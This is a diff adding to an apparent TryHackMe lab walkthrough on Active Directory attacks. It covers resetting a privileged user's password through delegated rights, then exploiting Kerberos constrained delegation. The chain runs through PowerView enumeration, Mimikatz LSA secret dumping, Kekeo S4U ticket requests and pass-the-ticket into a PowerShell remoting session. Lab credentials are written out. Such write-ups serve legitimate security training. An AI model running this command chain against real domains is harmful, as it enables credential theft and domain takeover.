@@ -1310,6 +1310,83 @@ Get-ADGroupMember -Identity "Tier 2 Admins"
 I choose `t2_melanie.davies`. Let's reset her password (as a member of __IT Support__ we can reset passwords of Tier 2 Admins):
 
 ```powershell
-$Password = ConvertTo-SecureString "SuperEasyPass123!@#" -AsPlainText -Force
+gpupdate /force
+$Password = ConvertTo-SecureString "strong.pass1" -AsPlainText -Force
 Set-ADAccountPassword -Identity "t2_melanie.davies" -Reset -NewPassword $Password
+```
+
+Now exit the shell and ssh back in as `t2_melanie.davies`:
+
+```
+ssh za.tryhackme.loc\\t2_melanie.davies@thmwrk1.za.tryhackme.loc
+```
+
+Locate the flag:
+
+```
+cd C:\Users\Administrator\Desktop
+type flag1.txt
+```
+
+Kerberos Delegation is a feature that allows applications, like a web server, to access resources hosted on another server on behalf of a user without directly giving the application access. This enables more secure and efficient access management, especially when dealing with services like SQL databases or web applications. There are three types of Kerberos Delegation: Unconstrained, Constrained, and Resource-Based Constrained Delegation (RBCD). Unconstrained Delegation, being the least secure, allows any service to impersonate a user without restrictions, while Constrained Delegation limits delegation to specific services. RBCD, introduced in 2012, further refines delegation by allowing the service to specify which accounts are allowed to delegate to it, enhancing security.
+
+Exploiting Constrained Delegation involves compromising an account with delegation rights and using tools like PowerView to enumerate delegations. Once an account with delegation rights (e.g., `svcIIS`) is obtained, a TGT (Ticket Granting Ticket) is generated for it, which can then be used to forge service tickets (TGS) for specific services, such as HTTP or WSMAN, using tools like Kekeo. These tickets can then be imported into memory with Mimikatz, allowing the attacker to impersonate a higher-privileged user. With the forged tickets, the attacker can establish a PowerShell session on a remote server (e.g., `THMSERVER1`), gaining access to sensitive resources as the impersonated user.
+
+We will exploit Constrained Delegation for this task. The first thing we need to do is enumerate available delegations. Let's use our new privileged user for the network couple of commands. We can use the Get-NetUser cmdlet of PowerSploit for this enumeration by running the following command:
+
+```powershell
+Import-Module C:\Tools\PowerView.ps1
+Get-NetUser -TrustedToAuth
+```
+
+Based on the output of this command, we can see that the svcIIS account can delegate the HTTP and WSMAN services on THMSERVER1. Once you've identified an account with delegation rights, the next step is to dump the credentials of the delegated account. To do this, you need to escalate privileges on the system and dump credentials from the Local Security Authority (LSA). 
+
+```powershell
+C:\Tools\mimikatz_trunk\x64\mimikatz.exe
+```
+
+```
+token::elevate
+lsadump::secrets
+```
+
+Once you have the credentials for svcIIS, you now have the necessary information to impersonate it. If it's an NTLM hash, you can use it for pass-the-hash attacks. If it's a plaintext password, you can use it directly to authenticate as svcIIS:
+
+```
+token::revert
+```
+```powershell
+C:\Tools\kekeo\x64\kekeo.exe
+```
+```
+tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:Password1@
+```
+
+Once you have the TGT for svcIIS, you can request TGS for specific services. For example, you know that svcIIS can delegate to the HTTP and WSMAN services on THMSERVER1.
+
+```
+tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc
+tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:wsman/THMSERVER1.za.tryhackme.loc
+exit
+```
+
+Now that we have the two TGS tickets, we can use Mimikatz to import them:
+
+```
+kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
+kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
+```
+
+With the tickets now injected into your session, you can authenticate as t1_trevor.jones and interact with the target system (e.g., THMSERVER1) using services like PowerShell Remoting:
+
+```powershell
+New-PSSession -ComputerName thmserver1.za.tryhackme.loc
+Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc
+```
+
+Get the flag:
+
+```
+cd C:\Users\Administrator\Desktop
+type flag2.txt
 ```
